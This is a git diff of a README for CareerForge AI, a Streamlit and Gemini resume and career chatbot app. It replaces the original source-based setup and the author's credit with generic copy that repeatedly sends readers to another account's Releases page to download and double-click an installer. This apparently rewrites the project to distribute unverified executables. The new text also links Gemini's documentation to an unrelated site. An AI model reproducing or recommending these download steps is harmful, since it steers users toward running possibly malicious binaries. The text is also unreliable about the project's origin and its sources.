@@ -1,107 +1,112 @@
-# 🚀 CareerForge AI
-> **Build. Scan. Succeed.** Your All-in-One AI Career Architect.
+# 🚀 CareerForge-AI - Your AI-Powered Career Companion
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
-![Streamlit](https://img.shields.io/badge/Streamlit-UI-red)
-![LangChain](https://img.shields.io/badge/LangChain-Orchestration-green)
-![Gemini](https://img.shields.io/badge/Google%20Gemini-2.5%20Flash-orange)
+[![Download CareerForge-AI](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/moti477/CareerForge-AI/releases)
 
-## 📖 Overview
-**CareerForge AI** is a full-stack AI platform designed to automate and optimize the job placement journey. Unlike simple wrapper tools, this application orchestrates multiple AI agents to handle specific career tasks: building ATS-proof resumes, analyzing job descriptions for gaps, and providing real-time interview coaching.
+## 📜 Description
 
-It leverages **Google Gemini 2.5** for intelligence and **LangChain** for robust model orchestration, wrapped in a high-performance **Streamlit** frontend.
+CareerForge-AI is an AI-powered career accelerator designed to help job seekers find their dream roles. It features an intelligent Resume Builder, ATS Scanner, and Career Chatbot. Built with Streamlit, Gemini 2.5, and LangChain, this application combines advanced tools to simplify job applications and increase your chances of success.
+
+## 🚀 Getting Started
+
+To get started with CareerForge-AI, follow the simple steps below. You will download and run the application easily on your computer.
+
+### 🖥️ System Requirements
+
+Before you begin, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later / macOS (latest version) / Linux (latest version)
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 4 GB minimum
+- **Disk Space:** At least 200 MB free
+
+### 📥 Download & Install
+
+You can download CareerForge-AI from our Releases page. Click the button below to visit the page and download the software.
+
+[Download CareerForge-AI](https://github.com/moti477/CareerForge-AI/releases)
+
+1. Open the link above.
+2. Look for the latest release.
+3. Click on the file that matches your operating system.
+4. Save the file to your desired location on your computer.
+
+### 🛠️ Installation Process
+
+1. Once the download is complete, locate the file you saved (it will usually be in your Downloads folder).
+2. Double-click on the file to start the installation.
+3. Follow the on-screen instructions to complete the installation process. 
+4. After installation, you can find the CareerForge-AI application in your applications list.
+
+## 🎨 Features
+
+CareerForge-AI includes several powerful features to assist you in your job search:
+
+- **Intelligent Resume Builder:** Create a professional resume tailored to your specific job applications in minutes.
+- **ATS Scanner:** Analyze your resume for compatibility with Applicant Tracking Systems to enhance your chances of getting noticed by employers.
+- **Career Chatbot:** Get real-time advice and responses to your career-related questions any time of the day.
+
+## 🔍 How to Use CareerForge-AI
+
+1. **Open the Application:** Launch CareerForge-AI from your applications list.
+2. **Select a Feature:** Choose between the Resume Builder, ATS Scanner, or Career Chatbot.
+3. **Follow Prompts:** Each feature will guide you through simple steps to maximize your outcome.
+
+### 📝 Tips for Best Use
+
+- When using the Resume Builder, include specific job titles and keywords from job postings for best results.
+- For the ATS Scanner, upload the job description of the role you are applying for to get relevant feedback on your resume.
+- Engage with the Career Chatbot for quick tips and strategies tailored to your career goals.
+
+## 📚 Support and Documentation
+
+Should you need more help using CareerForge-AI, check out our documentation available in the repository. This includes:
+
+- Detailed information on features.
+- Troubleshooting tips.
+- Frequently asked questions.
+
+### 💬 Feedback
+
+We welcome your feedback! Please report any issues or suggestions on our GitHub issues page. Your input helps us improve and enhances the tool for everyone.
+
+## 🌐 Community
+
+Join the CareerForge-AI community! Share your experiences and tips with other users. Participate in discussions, and gain insights into the latest trends in job searching.
+
+### ⭐ Topics
+
+- ai-assistant
+- ats
+- ats-scanner
+- ats-score-checker
+- career-development
+- chatbot
+- chatbot-application
+- gemini
+- langchain
+- langchain-python
+- python
+- resume-builder
+- streamlit
+
+## 🔗 Further Reading
+
+For more information about the technologies behind CareerForge-AI, consider reading the following resources:
+
+- [Streamlit Documentation](https://streamlit.io/docs/)
+- [Gemini Documentation](https://www.gemini.com/docs/)
+- [LangChain Documentation](https://langchain.readthedocs.io/)
+
+## 🤝 Contributing
+
+We welcome contributions from everyone. If you'd like to contribute to CareerForge-AI, please read the contribution guidelines in the repository. 
+
+### 💡 Ideas for Contributions
+
+- Report bugs or suggest new features.
+- Help improve existing features.
+- Create tutorials or documentation.
 
 ---
 
-## 🌟 Key Features
-
-### 1️⃣ 📝 Smart Resume Builder
-Transforms raw, unstructured user notes into a polished, professional PDF.
-* **Tech:** Uses `FPDF` for pixel-perfect layout and AI rewriting agents to convert basic sentences into "Action-Metric-Result" bullet points.
-* **Outcome:** Generates a downloadable, ATS-friendly PDF in seconds.
-
-### 2️⃣ 📊 ATS Scanner & Salary Predictor
-A strict algorithmic analysis of how well a resume matches a specific Job Description (JD).
-* **Tech:** Uses **Structured Output** to force the AI to return a specific JSON schema containing a Match Score (0-100), Missing Keywords list, and Salary Prediction (in LPA).
-* **Logic:** Hides the "Salary Prediction" unless the candidate crosses a "Hirable" threshold (Gamification).
-
-### 3️⃣ 🤖 AI Career Coach
-A context-aware chatbot that acts as a Senior Technical Recruiter.
-* **Tech:** Maintains **Chat History** in session state to remember previous context, allowing users to practice mock interviews or ask roadmap questions.
-
----
-
-## 🏗️ Technical Architecture (The "Hard Stuff")
-
-### 🧠 1. AI Orchestration & Structured Output
-Instead of relying on random text generation, this project uses **LangChain with Pydantic Models**.
-* **Problem:** LLMs often "hallucinate" or give unstructured text that breaks the UI.
-* **Solution:** I implemented strict `Pydantic` classes (e.g., `ATSAnalysis`) to define exactly what fields the AI *must* return (e.g., `is_hirable: bool`, `salary: str`).
-* **Result:** This ensures 100% reliable data parsing for the frontend dashboards.
-
-### 🔄 2. State Management & Data Flow
-The application uses a **Centralized Session State** architecture.
-* **Workflow:** When a user generates a resume on *Page 1*, the data is stored in `st.session_state['resume_text']`.
-* **Benefit:** When the user navigates to *Page 2 (Scanner)*, the app automatically retrieves this stored context. This creates a seamless, "Super App" experience where pages talk to each other without forcing the user to re-upload files.
-
-### ⚡ 3. Rapid Prototyping & GenAI Integration
-* **Philosophy:** This project follows a **"Backend-First"** approach.
-* **Execution:** While I architected the complex AI logic and Python backend manually, I leveraged **Generative AI** to accelerate the frontend development (CSS styling, responsive layouts).
-* **Impact:** This allowed me to focus 90% of my development time on solving business logic (chains, prompts, and validation) rather than debugging CSS pixels.
-
----
-
-## 🛠️ Tech Stack
-
-| Component | Technology | Purpose |
-| :--- | :--- | :--- |
-| **LLM** | Google Gemini 2.5 Flash-Lite | High-speed, low-latency reasoning |
-| **Orchestration** | LangChain | Managing prompts, chains, and memory |
-| **Validation** | Pydantic | Enforcing strict JSON output schemas |
-| **Frontend** | Streamlit | Responsive UI and State Management |
-| **PDF Engine** | PyPDF2 / FPDF | Text extraction and PDF generation |
-| **Environment** | Python 3.10+ | Core language |
-
----
-
-## 🚀 Installation & Setup
-
-**1. Clone the Repository**
-```bash
-git clone [https://github.com/yourusername/CareerForge-AI.git](https://github.com/yourusername/CareerForge-AI.git)
-cd CareerForge-AI
-```
-
-**2. Install Dependencies**
-
-```bash
-pip install -r requirements.txt
-```
-
-**3. Set up API Keys**
-Create a `.env` file in the root directory:
-
-```env
-GOOGLE_API_KEY=your_gemini_api_key_here
-```
-
-**4. Run the Application**
-
-```bash
-streamlit run app.py
-```
-
----
-
-## 🔮 Future Improvements
-
-* **Database Integration:** Saving user profiles and history using PostgreSQL/Supabase.
-* **RAG Implementation:** Allowing the Chatbot to "read" the user's uploaded resume to give more specific advice.
-* **Dashboard Analytics:** Tracking improvement scores over time.
-
----
-
-<div align="center">
-<small>Built with ❤️ by <b>Dev Doshi</b> | Powered by Google Gemini & LangChain</small>
-</div>
-
+Visit our [Releases page](https://github.com/moti477/CareerForge-AI/releases) to download CareerForge-AI and take the next step in your career journey!
